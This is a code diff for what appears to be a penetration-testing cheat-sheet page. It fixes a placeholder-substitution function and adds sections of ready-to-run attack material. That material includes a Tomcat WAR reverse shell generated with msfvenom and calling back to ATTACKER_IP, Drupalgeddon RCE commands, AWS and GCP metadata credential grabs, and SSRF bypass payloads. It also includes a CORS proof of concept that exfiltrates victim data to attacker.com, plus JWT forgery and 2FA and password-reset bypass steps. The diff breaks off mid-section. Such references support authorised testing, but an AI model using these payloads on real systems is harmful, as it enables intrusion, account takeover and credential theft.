@@ -24,14 +24,17 @@ function applyTargetToCommands(targetValue, targetType) {
   // Tools whose flags should be transformed in wildcard/list mode
   const transformTools = ['subfinder','amass','nuclei','assetfinder','ffuf','httpx','subjack','subzy','dnscan','dirsearch','gau','waymore'];
   // System utilities whose flags must NEVER be touched
-  const excludedTools = ['sort','uniq','grep','sed','awk','cat','jq','prips','dig','masscan'];
+  const excludedTools = ['sort','uniq','grep','sed','awk','cat','jq','prips','dig','masscan',
+    'tee','head','tail','wc','tr','cut','xargs','echo','curl','wget'];
 
   originalCodeContents.forEach((original, codeEl) => {
     let text = original;
-    // Replace domain/host placeholders with targetValue (including inside URLs)
-    text = text.replace(/(?:example|site|Target)\.com/gi, targetValue);
 
     if (isBulk) {
+      // Bug 1 fix: In URLs (after :// or //) replace domain with FUZZ; standalone refs get targetValue filename
+      text = text.replace(/(?<=:\/\/|\/\/)(?:example|site|Target)\.com/gi, 'FUZZ');
+      text = text.replace(/\b(?:example|site|Target)\.com\b/gi, targetValue);
+
       // Handle special subfinder pipe pattern first (line-level)
       text = text.replace(/echo\s+["']?[^"'\n|]+["']?\s*\|\s*subfinder\b/g, 'subfinder -dL ' + targetValue);
 
@@ -53,14 +56,34 @@ function applyTargetToCommands(targetValue, targetType) {
           const usesTransformTool = toolPattern.test(trimmed);
 
           if (usesTransformTool) {
-            seg = seg.replace(/(^|\s)-d(?=\s|$)/gm, '$1-dL');
-            seg = seg.replace(/(^|\s)-u(?=\s|$)/gm, '$1-l');
+            const isFfuf = /\bffuf\b/.test(trimmed);
+            const isAmass = /\bamass\b/.test(trimmed);
+
+            // Bug 3 fix: amass uses -df for file input, other tools use -dL
+            if (isAmass) {
+              seg = seg.replace(/(^|\s)-d(?=\s|$)/gm, '$1-df');
+            } else {
+              seg = seg.replace(/(^|\s)-d(?=\s|$)/gm, '$1-dL');
+            }
+
+            // Bug 2 fix: ffuf keeps -u and receives -w wordlist; other tools change -u to -l
+            if (isFfuf) {
+              if (!/(^|\s)-w(?=\s|$)/.test(seg)) {
+                seg = seg.trimEnd() + ' -w ' + targetValue;
+              }
+            } else {
+              seg = seg.replace(/(^|\s)-u(?=\s|$)/gm, '$1-l');
+            }
+
             seg = seg.replace(/(^|\s)-i(?=\s|$)/gm, '$1-I');
           }
 
           return seg;
         }).join('|');
       }).join('\n');
+    } else {
+      // Domain mode: replace all placeholders with targetValue
+      text = text.replace(/(?:example|site|Target)\.com/gi, targetValue);
     }
 
     codeEl.textContent = text;
@@ -730,6 +753,708 @@ function injectMigratedContent() {
       body.appendChild(sub3);
     }
   }
+
+  // --- Sec 36 (Technology-Specific): Add AEM, wpscan, Drupal, Firebase, Tomcat ---
+  const sec36tech = document.getElementById('sec-36');
+  if (sec36tech) {
+    const body = sec36tech.querySelector('.section-body');
+    if (body) {
+      const frag = document.createDocumentFragment();
+
+      const subAem = createSubsection('Adobe Experience Manager (AEM)');
+      subAem.appendChild(createCodeBlock('bash',
+        '# AEM fingerprinting and exploitation\n' +
+        'python aem_hacker.py -u <URL> --host <Your_IP>\n\n' +
+        '# AEM dispatcher bypass (access restricted paths)\n' +
+        "curl 'https://TARGET/bin/querybuilder.json.;%0aa.css?path=/etc&p.hits=full&p.limit=-1'\n\n" +
+        '# Useful AEM endpoints\n' +
+        'GET /system/console/bundles\n' +
+        'GET /crx/de/index.jsp\n' +
+        'GET /etc/packages.json\n' +
+        'GET /.json\n' +
+        'GET /content.infinity.json\n' +
+        'GET /libs/granite/core/content/login.html\n\n' +
+        '# AEM user enumeration\n' +
+        'GET /bin/querybuilder.json?type=rep:User&p.limit=-1&p.hits=full'
+      ));
+      frag.appendChild(subAem);
+
+      const subWp = createSubsection('WordPress — wpscan Aggressive Mode');
+      subWp.appendChild(createCodeBlock('bash',
+        '# Aggressive full scan\n' +
+        'wpscan --url TARGET --api-token TOKEN -e at -e ap -e u \\\n' +
+        '  --enumerate ap --plugins-detection aggressive --force\n\n' +
+        '# User enumeration only\n' +
+        'wpscan --url TARGET -e u\n\n' +
+        '# Password brute force\n' +
+        'wpscan --url TARGET -U admin -P /usr/share/wordlists/rockyou.txt\n\n' +
+        '# Check xmlrpc.php for brute-force / SSRF\n' +
+        'curl -s -X POST TARGET/xmlrpc.php \\\n' +
+        "  -d '<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName></methodCall>'"
+      ));
+      frag.appendChild(subWp);
+
+      const subDrupal = createSubsection('Drupal — droopescan & Drupalgeddon');
+      subDrupal.appendChild(createCodeBlock('bash',
+        '# Fingerprinting with droopescan\n' +
+        'droopescan scan drupal -u https://TARGET\n\n' +
+        '# Drupalgeddon2 (CVE-2018-7600) — unauthenticated RCE\n' +
+        'python drupalgeddon2.py -u https://TARGET\n\n' +
+        '# Drupalgeddon3 (CVE-2018-7602) — authenticated RCE\n' +
+        'python drupalgeddon3.py https://TARGET/node/1 <session_cookie>\n\n' +
+        '# Check common Drupal paths\n' +
+        'GET /CHANGELOG.txt\n' +
+        'GET /?q=admin\n' +
+        'GET /admin/config/development/maintenance\n' +
+        'GET /user/register'
+      ));
+      frag.appendChild(subDrupal);
+
+      const subFirebase = createSubsection('Firebase Misconfiguration');
+      subFirebase.appendChild(createCodeBlock('bash',
+        '# Check for open Firebase database (unauthenticated read)\n' +
+        'curl https://vuln-domain.firebaseio.com/.json\n\n' +
+        '# Enumerate subpaths\n' +
+        'curl https://vuln-domain.firebaseio.com/users.json\n' +
+        'curl https://vuln-domain.firebaseio.com/admin.json\n\n' +
+        '# Test write access\n' +
+        'curl -X PUT https://vuln-domain.firebaseio.com/test.json -d \'{"pwned":true}\'\n\n' +
+        '# Firebase security rules endpoint\n' +
+        'curl https://vuln-domain.firebaseio.com/.settings/rules.json\n\n' +
+        '# Firebase Storage bucket (default naming)\n' +
+        'curl https://firebasestorage.googleapis.com/v0/b/vuln-domain.appspot.com/o'
+      ));
+      frag.appendChild(subFirebase);
+
+      const subTomcat = createSubsection('Apache Tomcat — Default Creds & Manager');
+      subTomcat.appendChild(createCodeBlock('bash',
+        '# Default credentials to try\n' +
+        '# admin:admin, admin:password, tomcat:tomcat, admin:tomcat\n' +
+        '# manager:manager, admin:s3cret, tomcat:s3cret\n\n' +
+        '# Access Tomcat Manager\n' +
+        'GET /manager/html\n' +
+        'GET /host-manager/html\n\n' +
+        '# Upload WAR shell via Manager API\n' +
+        'curl -u tomcat:tomcat -T shell.war \\\n' +
+        '  "http://TARGET:8080/manager/text/deploy?path=/shell&update=true"\n\n' +
+        '# Generate WAR shell with msfvenom\n' +
+        'msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war > shell.war\n\n' +
+        '# CVE-2020-1938 — Ghostcat (AJP file read/RCE)\n' +
+        'python ghostcat.py -a TARGET -p 8009 -f /WEB-INF/web.xml'
+      ));
+      frag.appendChild(subTomcat);
+
+      body.appendChild(frag);
+    }
+  }
+
+  // --- Sec 35 (GraphQL Testing) ---
+  const sec35 = document.getElementById('sec-35');
+  if (sec35) {
+    const body = sec35.querySelector('.section-body');
+    if (body) {
+      const frag = document.createDocumentFragment();
+
+      const subIntro = createSubsection('Full Introspection Query');
+      subIntro.appendChild(createCodeBlock('graphql',
+        'query IntrospectionQuery {\n' +
+        '  __schema {\n' +
+        '    queryType { name }\n' +
+        '    mutationType { name }\n' +
+        '    subscriptionType { name }\n' +
+        '    types { ...FullType }\n' +
+        '    directives {\n' +
+        '      name\n' +
+        '      description\n' +
+        '      locations\n' +
+        '      args { ...InputValue }\n' +
+        '    }\n' +
+        '  }\n' +
+        '}\n' +
+        'fragment FullType on __Type {\n' +
+        '  kind\n' +
+        '  name\n' +
+        '  description\n' +
+        '  fields(includeDeprecated: true) {\n' +
+        '    name\n' +
+        '    description\n' +
+        '    args { ...InputValue }\n' +
+        '    type { ...TypeRef }\n' +
+        '    isDeprecated\n' +
+        '    deprecationReason\n' +
+        '  }\n' +
+        '  inputFields { ...InputValue }\n' +
+        '  interfaces { ...TypeRef }\n' +
+        '  enumValues(includeDeprecated: true) {\n' +
+        '    name\n' +
+        '    description\n' +
+        '    isDeprecated\n' +
+        '    deprecationReason\n' +
+        '  }\n' +
+        '  possibleTypes { ...TypeRef }\n' +
+        '}\n' +
+        'fragment InputValue on __InputValue {\n' +
+        '  name\n' +
+        '  description\n' +
+        '  type { ...TypeRef }\n' +
+        '  defaultValue\n' +
+        '}\n' +
+        'fragment TypeRef on __Type {\n' +
+        '  kind\n' +
+        '  name\n' +
+        '  ofType {\n' +
+        '    kind\n' +
+        '    name\n' +
+        '    ofType {\n' +
+        '      kind\n' +
+        '      name\n' +
+        '      ofType {\n' +
+        '        kind\n' +
+        '        name\n' +
+        '        ofType {\n' +
+        '          kind\n' +
+        '          name\n' +
+        '          ofType {\n' +
+        '            kind\n' +
+        '            name\n' +
+        '            ofType { kind name }\n' +
+        '          }\n' +
+        '        }\n' +
+        '      }\n' +
+        '    }\n' +
+        '  }\n' +
+        '}'
+      ));
+      frag.appendChild(subIntro);
+
+      const subFinger = createSubsection('Fingerprinting, Threat Matrix & Introspection Bypass');
+      subFinger.appendChild(createCodeBlock('bash',
+        '# graphw00f — GraphQL fingerprinting\n' +
+        'python3 main.py -d -f -t http://TARGET\n\n' +
+        '# graphql-threat-matrix reference\n' +
+        '# https://github.com/nicholasaleks/graphql-threat-matrix\n\n' +
+        '# Bypass introspection disabled via comma technique\n' +
+        '# Replace newlines with commas in the __schema query:\n' +
+        '__schema{queryType,mutationType,subscriptionType{name},types{...FullType},directives{name,description,locations,args{...InputValue}}}\n\n' +
+        '# Bypass using inline fragments instead of named fragments\n' +
+        'query { __type(name: "Query") { fields { name type { name kind } } } }\n\n' +
+        '# Field suggestion brute-force (useful when introspection blocked)\n' +
+        '# Try: query { __typename }  — always works even with introspection off'
+      ));
+      frag.appendChild(subFinger);
+
+      const subMut = createSubsection('Mutation Attacks & Batched Query Abuse');
+      subMut.appendChild(createCodeBlock('graphql',
+        '# Mass assignment via mutation\n' +
+        'mutation {\n' +
+        '  updateUser(id: 1, input: { role: "admin", email: "attacker@evil.com" }) {\n' +
+        '    id role email\n' +
+        '  }\n' +
+        '}\n\n' +
+        '# IDOR via mutation\n' +
+        'mutation {\n' +
+        '  deleteUser(id: 2) { success }\n' +
+        '}\n\n' +
+        '# Batched queries — rate limit / brute force bypass\n' +
+        '[{"query":"mutation{login(user:\\"admin\\",pass:\\"password1\\")}"},\n' +
+        ' {"query":"mutation{login(user:\\"admin\\",pass:\\"password2\\")}"},\n' +
+        ' {"query":"mutation{login(user:\\"admin\\",pass:\\"password3\\")}"}]\n\n' +
+        '# Alias-based brute force (single request)\n' +
+        'mutation {\n' +
+        '  a1: login(user: "admin", pass: "pass1") { token }\n' +
+        '  a2: login(user: "admin", pass: "pass2") { token }\n' +
+        '  a3: login(user: "admin", pass: "pass3") { token }\n' +
+        '}'
+      ));
+      frag.appendChild(subMut);
+
+      body.appendChild(frag);
+    }
+  }
+
+  // --- Sec 48 (S3 Bucket Testing) ---
+  const sec48 = document.getElementById('sec-48');
+  if (sec48) {
+    const body = sec48.querySelector('.section-body');
+    if (body) {
+      const frag = document.createDocumentFragment();
+
+      const subS3 = createSubsection('AWS S3 Enumeration & Exploitation');
+      subS3.appendChild(createCodeBlock('bash',
+        '# Sync bucket contents locally (if public read)\n' +
+        'aws s3 sync s3://BUCKET-NAME . --no-sign-request\n\n' +
+        '# List bucket objects\n' +
+        'aws s3 ls s3://BUCKET-NAME --no-sign-request\n\n' +
+        '# Test write access\n' +
+        'aws s3 cp test.txt s3://BUCKET-NAME/test.txt --no-sign-request\n\n' +
+        '# Bucket versioning — list all versions including deleted files\n' +
+        'GET https://BUCKET-NAME.s3.amazonaws.com/?versions\n' +
+        'GET https://BUCKET-NAME.s3.amazonaws.com/file.txt?versionId=VERSION_ID\n\n' +
+        '# Cloud metadata endpoint (SSRF → IAM credentials)\n' +
+        'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n' +
+        'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME\n\n' +
+        '# IMDSv2 (token-based)\n' +
+        'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")\n' +
+        'curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/'
+      ));
+      frag.appendChild(subS3);
+
+      const subGcs = createSubsection('Google Cloud Storage (gsutil)');
+      subGcs.appendChild(createCodeBlock('bash',
+        '# List GCS bucket (if public)\n' +
+        'gsutil ls gs://BUCKET-NAME\n\n' +
+        '# Download all files\n' +
+        'gsutil -m cp -r gs://BUCKET-NAME .\n\n' +
+        '# Check bucket ACL\n' +
+        'gsutil acl get gs://BUCKET-NAME\n\n' +
+        '# Check IAM policy\n' +
+        'gsutil iam get gs://BUCKET-NAME\n\n' +
+        '# Test write\n' +
+        'gsutil cp test.txt gs://BUCKET-NAME/test.txt\n\n' +
+        '# GCP metadata endpoint\n' +
+        'curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \\\n' +
+        '  -H "Metadata-Flavor: Google"'
+      ));
+      frag.appendChild(subGcs);
+
+      const subSteg = createSubsection('Steganography & Hidden Data Extraction');
+      subSteg.appendChild(createCodeBlock('bash',
+        '# Extract hidden data from image with steghide\n' +
+        'steghide extract -sf image.jpg\n' +
+        'steghide extract -sf image.jpg -p "password"\n\n' +
+        '# Check for hidden data without extracting\n' +
+        'steghide info image.jpg\n\n' +
+        '# Use stegcracker to brute-force passphrase\n' +
+        'stegcracker image.jpg /usr/share/wordlists/rockyou.txt\n\n' +
+        '# binwalk — find embedded files in binary\n' +
+        'binwalk -e file.jpg\n\n' +
+        '# exiftool — read metadata (may reveal paths, usernames, GPS)\n' +
+        'exiftool image.jpg'
+      ));
+      frag.appendChild(subSteg);
+
+      body.appendChild(frag);
+    }
+  }
+
+  // --- Sec 45 (SSRF) ---
+  const sec45 = document.getElementById('sec-45');
+  if (sec45) {
+    const body = sec45.querySelector('.section-body');
+    if (body) {
+      const frag = document.createDocumentFragment();
+
+      const subBypass = createSubsection('localhost / 127.0.0.1 Bypass Techniques');
+      subBypass.appendChild(createCodeBlock('text',
+        '# Decimal representation\n' +
+        '2130706433\n\n' +
+        '# Hex representation\n' +
+        '0x7f000001\n\n' +
+        '# Octal representation\n' +
+        '0177.0000.0000.0001\n\n' +
+        '# IPv6 loopback\n' +
+        '::1\n\n' +
+        '# IPv4-mapped IPv6\n' +
+        '::ffff:127.0.0.1\n\n' +
+        '# Short notation\n' +
+        '127.1\n\n' +
+        '# All-zero address\n' +
+        '0.0.0.0\n\n' +
+        '# Zero short form\n' +
+        '0\n\n' +
+        '# DNS rebinding / open redirect chaining\n' +
+        'http://localtest.me/\n' +
+        'http://customer1.app.localhost.my.company.127.0.0.1.nip.io\n' +
+        'http://spoofed.burpcollaborator.net'
+      ));
+      frag.appendChild(subBypass);
+
+      const subFrameworks = createSubsection('Framework-Specific SSRF Payloads');
+      subFrameworks.appendChild(createCodeBlock('http',
+        '# Spring Boot — semicolon separator bypass\n' +
+        'GET ;@burpcollaborator.com HTTP/1.1\n' +
+        'Host: TARGET\n\n' +
+        '# Flask — @ symbol bypass\n' +
+        'GET @burpcollaborator.com HTTP/1.1\n' +
+        'Host: TARGET\n\n' +
+        '# CRLF injection to smuggle SSRF\n' +
+        'GET /%0d%0aHost:%20burpcollaborator.com HTTP/1.1\n' +
+        'Host: TARGET\n\n' +
+        '# SNI-based SSRF (for TLS connections)\n' +
+        '# Change SNI in TLS ClientHello to internal host'
+      ));
+      frag.appendChild(subFrameworks);
+
+      const subBlind = createSubsection('Blind SSRF — Time-Based & Out-of-Band');
+      subBlind.appendChild(createCodeBlock('html',
+        '<!-- Time-based blind SSRF via HTML rendering -->\n' +
+        '<img src="http://BURP_COLLABORATOR/">\n' +
+        '<iframe src="http://BURP_COLLABORATOR/"></iframe>\n' +
+        '<link rel="stylesheet" href="http://BURP_COLLABORATOR/">\n\n' +
+        '<!-- PDF/SVG render SSRF -->\n' +
+        '<svg xmlns="http://www.w3.org/2000/svg">\n' +
+        '  <image href="http://BURP_COLLABORATOR/ssrf.svg"/>\n' +
+        '</svg>'
+      ));
+      frag.appendChild(subBlind);
+
+      const subRedir = createSubsection('SSRF via Open Redirect');
+      subRedir.appendChild(createCodeBlock('php',
+        '<?php\n' +
+        '// Host an open redirect on your server, then use it as SSRF target\n' +
+        "header('Location: http://169.254.169.254/latest/meta-data/');\n" +
+        '?>\n\n' +
+        '# Payload to target application:\n' +
+        '?url=https://attacker.com/redirect.php\n\n' +
+        '# If target follows redirects, it hits the internal endpoint\n\n' +
+        '# URL-encoded redirect payload (bypass blocklist)\n' +
+        '?url=https%3A%2F%2Fattacker.com%2Fredirect.php\n\n' +
+        '# Double URL encoding\n' +
+        '?url=https%253A%252F%252Fattacker.com%252Fredirect.php'
+      ));
+      frag.appendChild(subRedir);
+
+      body.appendChild(frag);
+    }
+  }
+
+  // --- Sec 41 (CORS) ---
+  const sec41 = document.getElementById('sec-41');
+  if (sec41) {
+    const body = sec41.querySelector('.section-body');
+    if (body) {
+      const frag = document.createDocumentFragment();
+
+      const subPoc = createSubsection('CORS Credential Theft — Full HTML PoC');
+      subPoc.appendChild(createCodeBlock('html',
+        '<!-- Host on attacker.com, victim visits while logged into target -->\n' +
+        '<html>\n' +
+        '<body>\n' +
+        '<script>\n' +
+        '  var xhr = new XMLHttpRequest();\n' +
+        '  xhr.open("GET", "https://TARGET/api/user/profile", true);\n' +
+        '  xhr.withCredentials = true;\n' +
+        '  xhr.onreadystatechange = function() {\n' +
+        '    if (xhr.readyState === 4) {\n' +
+        '      fetch("https://attacker.com/log?data=" + btoa(xhr.responseText));\n' +
+        '    }\n' +
+        '  };\n' +
+        '  xhr.send();\n' +
+        '</script>\n' +
+        '</body>\n' +
+        '</html>\n\n' +
+        '<!-- Fetch API version with credentials -->\n' +
+        '<script>\n' +
+        "  fetch('https://TARGET/api/sensitive', { credentials: 'include' })\n" +
+        '    .then(r => r.text())\n' +
+        "    .then(d => fetch('https://attacker.com/log?d=' + btoa(d)));\n" +
+        '</script>'
+      ));
+      frag.appendChild(subPoc);
+
+      const subBypass = createSubsection('Origin Bypass Techniques');
+      subBypass.appendChild(createCodeBlock('text',
+        '# Null origin (sandboxed iframe / data: URI)\n' +
+        'Origin: null\n\n' +
+        '# Subdomain injection (if regex checks for "victim.com")\n' +
+        'Origin: https://victim.com.attacker.com\n' +
+        'Origin: https://attackervictim.com\n' +
+        'Origin: https://attacker.com.victim.com\n\n' +
+        '# Suffix bypass (if only suffix is checked)\n' +
+        'Origin: https://notreallyvictim.com\n\n' +
+        '# Prefix bypass\n' +
+        'Origin: https://victim.com.attacker.com\n\n' +
+        '# HTTP vs HTTPS mismatch\n' +
+        'Origin: http://victim.com\n\n' +
+        '# Trusted subdomain takeover + CORS exploit chain\n' +
+        '# 1. Find subdomain pointing to unclaimed service (e.g., S3, GitHub Pages)\n' +
+        '# 2. Claim the service and host CORS exploit payload there\n' +
+        '# 3. subdomain.victim.com is trusted, so credentials are returned'
+      ));
+      frag.appendChild(subBypass);
+
+      body.appendChild(frag);
+    }
+  }
+
+  // --- Sec 28 (OAuth Attacks) ---
+  const sec28 = document.getElementById('sec-28');
+  if (sec28) {
+    const body = sec28.querySelector('.section-body');
+    if (body) {
+      const frag = document.createDocumentFragment();
+
+      const subRedirect = createSubsection('redirect_uri Bypass Payloads');
+      subRedirect.appendChild(createCodeBlock('text',
+        '# Fragment bypass (token stored in hash, not sent to server)\n' +
+        'https://hacker.com#victim.com\n\n' +
+        '# Subdomain confusion\n' +
+        'https://victim.com.hacker.com\n\n' +
+        '# @ confusion — browser sends to hacker.com\n' +
+        'https://victim.com@hacker.com\n\n' +
+        '# Backslash bypass\n' +
+        '\\/\\/yoururl.com\n\n' +
+        '# Double-slash confusion\n' +
+        '//theirsite@yoursite.com\n\n' +
+        '# Path traversal in redirect_uri\n' +
+        'https://victim.com/oauth/callback/../../../logout\n\n' +
+        '# Open redirect chaining: redirect_uri → open redirect on victim domain\n' +
+        'redirect_uri=https://victim.com/redirect?url=https://attacker.com'
+      ));
+      frag.appendChild(subRedirect);
+
+      const subCsrf = createSubsection('CSRF via Missing State Parameter');
+      subCsrf.appendChild(createCodeBlock('text',
+        '# Exploit:\n' +
+        '# 1. Attacker initiates OAuth flow, intercepts the authorization URL\n' +
+        '# 2. Drops the state parameter or uses a fixed/known value\n' +
+        '# 3. Crafts CSRF payload that sends victim to attacker-controlled code\n' +
+        '# 4. Server links attacker code to victim account\n\n' +
+        '# Check 1: Is state missing from the authorization request?\n' +
+        'GET /oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=https://TARGET/callback\n\n' +
+        '# Check 2: Is state validated on the callback?\n' +
+        'GET /callback?code=AUTH_CODE  (no state= parameter)\n\n' +
+        '# Check 3: Does a fixed/predictable state pass validation?\n' +
+        'state=aaaa or state=12345'
+      ));
+      frag.appendChild(subCsrf);
+
+      const subLeak = createSubsection('access_token Leak via Referrer Header');
+      subLeak.appendChild(createCodeBlock('text',
+        '# Scenario: token is returned in URL fragment (#access_token=...)\n' +
+        '# If the callback page loads external resources (images, scripts, stylesheets)\n' +
+        '# The Referer header may include the token\n\n' +
+        '# Check for:\n' +
+        '# 1. Authorization servers using response_type=token (implicit flow)\n' +
+        '# 2. Callback pages that reference external domains\n' +
+        '# 3. Logging/analytics tools that capture the full Referer\n\n' +
+        '# Reproduce:\n' +
+        '# 1. Complete OAuth flow (implicit), observe redirect URL with #access_token=\n' +
+        '# 2. Check network requests from the callback page\n' +
+        '# 3. Look for Referer headers containing the token in server logs / Burp\n\n' +
+        '# Mitigation check: does server return Referrer-Policy: no-referrer header?'
+      ));
+      frag.appendChild(subLeak);
+
+      body.appendChild(frag);
+    }
+  }
+
+  // --- Sec 29 (JWT Attacks) ---
+  const sec29 = document.getElementById('sec-29');
+  if (sec29) {
+    const body = sec29.querySelector('.section-body');
+    if (body) {
+      const frag = document.createDocumentFragment();
+
+      const subNone = createSubsection('"none" Algorithm Attack');
+      subNone.appendChild(createCodeBlock('bash',
+        '# Craft a JWT with alg: none to bypass signature verification\n' +
+        '# Header: {"alg":"none","typ":"JWT"}\n' +
+        '# Payload: {"sub":"admin","role":"admin"}\n' +
+        '# Signature: (empty)\n\n' +
+        '# Base64url encode header and payload (no padding)\n' +
+        'HEADER=$(echo -n \'{"alg":"none","typ":"JWT"}\' | base64 | tr -d "=" | tr \'+/\' \'-_\')\n' +
+        'PAYLOAD=$(echo -n \'{"sub":"admin","role":"admin","iat":1234567890}\' | base64 | tr -d "=" | tr \'+/\' \'-_\')\n' +
+        'TOKEN="${HEADER}.${PAYLOAD}."\n\n' +
+        '# Variants to try (some libraries are case-sensitive)\n' +
+        '# "alg": "None", "NONE", "nOnE"'
+      ));
+      frag.appendChild(subNone);
+
+      const subKid = createSubsection('"kid" Parameter Path Traversal');
+      subKid.appendChild(createCodeBlock('json',
+        '// Modify the JWT header kid to point to a known file (e.g., /dev/null or empty file)\n' +
+        '// If kid is used in a file read to load HMAC key, /dev/null = empty key = sign with ""\n' +
+        '{\n' +
+        '  "alg": "HS256",\n' +
+        '  "typ": "JWT",\n' +
+        '  "kid": "../../../../../../dev/null"\n' +
+        '}\n\n' +
+        '// Sign the token with an empty string as the secret\n' +
+        '// Also try: /proc/sys/kernel/randomize_va_space (known content)\n\n' +
+        '// kid SQL injection (if kid is used in a SQL query)\n' +
+        '{\n' +
+        '  "kid": "x\' UNION SELECT \'attacker_secret\' -- -"\n' +
+        '}\n' +
+        '// Then sign the JWT with the secret "attacker_secret"'
+      ));
+      frag.appendChild(subKid);
+
+      const subAlgoConf = createSubsection('Algorithm Confusion (RS256 → HS256)');
+      subAlgoConf.appendChild(createCodeBlock('bash',
+        '# If server uses RS256 (asymmetric), change alg to HS256 (symmetric)\n' +
+        '# Use the PUBLIC key as the HMAC secret — server may verify with same key\n\n' +
+        '# Step 1: Obtain the public key (check /jwks.json, /.well-known/openid-configuration)\n' +
+        'curl https://TARGET/.well-known/jwks.json\n\n' +
+        '# Step 2: Convert JWK public key to PEM\n' +
+        '# (use jwt_tool or python-jose)\n\n' +
+        '# Step 3: Forge HS256 JWT signed with the PEM public key bytes\n' +
+        "python3 -c \"\nimport jwt, base64\nwith open('public.pem','rb') as f: key=f.read()\ntoken=jwt.encode({'sub':'admin','role':'admin'},key,algorithm='HS256')\nprint(token)\"\n\n" +
+        '# Automated: use jwt_tool\n' +
+        'python3 jwt_tool.py TOKEN -X k -pk public.pem'
+      ));
+      frag.appendChild(subAlgoConf);
+
+      const subBrute = createSubsection('Brute Force JWT Secret & JWK/JKU Injection');
+      subBrute.appendChild(createCodeBlock('bash',
+        '# Brute force weak HMAC secret\n' +
+        'hashcat -a 0 -m 16500 <JWT_TOKEN> /usr/share/wordlists/rockyou.txt\n' +
+        'python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt\n\n' +
+        '# JWK injection — embed attacker public key in header\n' +
+        '# Modify header to include "jwk" field with your own RSA public key\n' +
+        '# Sign token with corresponding private key\n' +
+        '# If library trusts embedded JWK → accepts forged token\n\n' +
+        '# JKU injection — point to attacker-hosted JWKS\n' +
+        '# Modify header: "jku": "https://attacker.com/jwks.json"\n' +
+        '# Host JWKS with your public key at that URL\n' +
+        '# Sign token with corresponding private key\n\n' +
+        '# x5u injection — same concept but with X.509 certificate URL\n' +
+        '# "x5u": "https://attacker.com/cert.pem"'
+      ));
+      frag.appendChild(subBrute);
+
+      body.appendChild(frag);
+    }
+  }
+
+  // --- Sec 20 (2FA Bypass) ---
+  const sec20 = document.getElementById('sec-20');
+  if (sec20) {
+    const body = sec20.querySelector('.section-body');
+    if (body) {
+      const frag = document.createDocumentFragment();
+
+      const subRace = createSubsection('Race Condition 2FA Bypass');
+      subRace.appendChild(createCodeBlock('text',
+        '# Exploit: send multiple simultaneous OTP submission requests\n' +
+        '# A race condition may allow the same code to validate twice\n' +
+        '# or allow a code submitted after expiry to succeed\n\n' +
+        '# Steps:\n' +
+        '# 1. Trigger 2FA — receive OTP\n' +
+        '# 2. In Burp Repeater / Turbo Intruder, send 10-20 simultaneous POST requests\n' +
+        '#    all with the same OTP code\n' +
+        '# 3. Check if any response returns a valid session\n\n' +
+        '# Turbo Intruder race condition template:\n' +
+        '# def queueRequests(target, wordlists):\n' +
+        '#     for i in range(20):\n' +
+        '#         engine.queue(target.req)\n' +
+        '# def handleResponse(req, interesting):\n' +
+        '#     if "dashboard" in req.response: ...'
+      ));
+      frag.appendChild(subRace);
+
+      const subNav = createSubsection('Direct Navigation Bypass & Backup Code Brute Force');
+      subNav.appendChild(createCodeBlock('text',
+        '# Direct navigation bypass:\n' +
+        '# After entering username/password (step 1), skip the 2FA step\n' +
+        '# Navigate directly to an authenticated endpoint\n' +
+        'GET /dashboard\n' +
+        'GET /account/settings\n' +
+        '# If the server only checks step-1 auth cookie and not 2FA completion\n' +
+        '# the page will load — this is a logic flaw\n\n' +
+        '# Backup code brute force:\n' +
+        '# Backup codes are often 6-8 digit numeric\n' +
+        '# If no rate limiting on backup code endpoint:\n' +
+        'ffuf -u https://TARGET/account/2fa/backup -X POST \\\n' +
+        '  -d "backup_code=FUZZ" -w backup_codes_wordlist.txt \\\n' +
+        '  -H "Cookie: session=SESSION_COOKIE" -mc 302,200\n\n' +
+        '# OAuth login bypass:\n' +
+        '# If app allows login via OAuth (Google/GitHub)\n' +
+        '# Try logging in via OAuth — 2FA may not be triggered for social logins'
+      ));
+      frag.appendChild(subNav);
+
+      const subSession = createSubsection('Session Swap Technique Between Browsers');
+      subSession.appendChild(createCodeBlock('text',
+        '# Session swap / 2FA step confusion:\n' +
+        '# 1. Browser A: complete step 1 (username/password) — get pre-2FA session\n' +
+        '# 2. Browser B: complete both steps for a DIFFERENT account you control\n' +
+        '#    — get a fully authenticated session cookie\n' +
+        '# 3. In Browser A: replace the pre-2FA session cookie\n' +
+        '#    with the fully-authenticated session from Browser B\n' +
+        '# 4. Navigate to authenticated endpoint\n' +
+        '# If the server does not bind the session to the specific user during 2FA,\n' +
+        '# Browser A may gain access to the victim account without completing 2FA\n\n' +
+        '# Also test:\n' +
+        '# - Re-using a previously valid (now expired) 2FA code\n' +
+        '# - Submitting OTP from a different account\n' +
+        '# - Response manipulation: change "status":"fail" to "status":"success"'
+      ));
+      frag.appendChild(subSession);
+
+      body.appendChild(frag);
+    }
+  }
+
+  // --- Sec 18 (Reset Password) ---
+  const sec18 = document.getElementById('sec-18');
+  if (sec18) {
+    const body = sec18.querySelector('.section-body');
+    if (body) {
+      const frag = document.createDocumentFragment();
+
+      const subEmailChain = createSubsection('Email Verification Bypass Chain');
+      subEmailChain.appendChild(createCodeBlock('text',
+        '# Exploit:\n' +
+        '# 1. Register an account with email: attacker@attacker.com\n' +
+        '# 2. Change email to victim@victim.com BEFORE verifying the original email\n' +
+        '# 3. Check if the old verification link (sent to attacker@attacker.com)\n' +
+        '#    still verifies the account — now with victim email\n' +
+        '# 4. If yes: you control an account with victim email without access to inbox\n\n' +
+        '# Variant — pre-account takeover:\n' +
+        '# 1. Register attacker-controlled account with victim email (if no email check at signup)\n' +
+        '# 2. Set up the account (add phone 2FA, known password)\n' +
+        '# 3. Victim later registers with same email → app links to existing account\n' +
+        '# 4. Attacker still has access'
+      ));
+      frag.appendChild(subEmailChain);
+
+      const subHost = createSubsection('Host Header Injection in Password Reset');
+      subHost.appendChild(createCodeBlock('http',
+        '# Standard password reset request\n' +
+        'POST /account/reset-password HTTP/1.1\n' +
+        'Host: TARGET\n' +
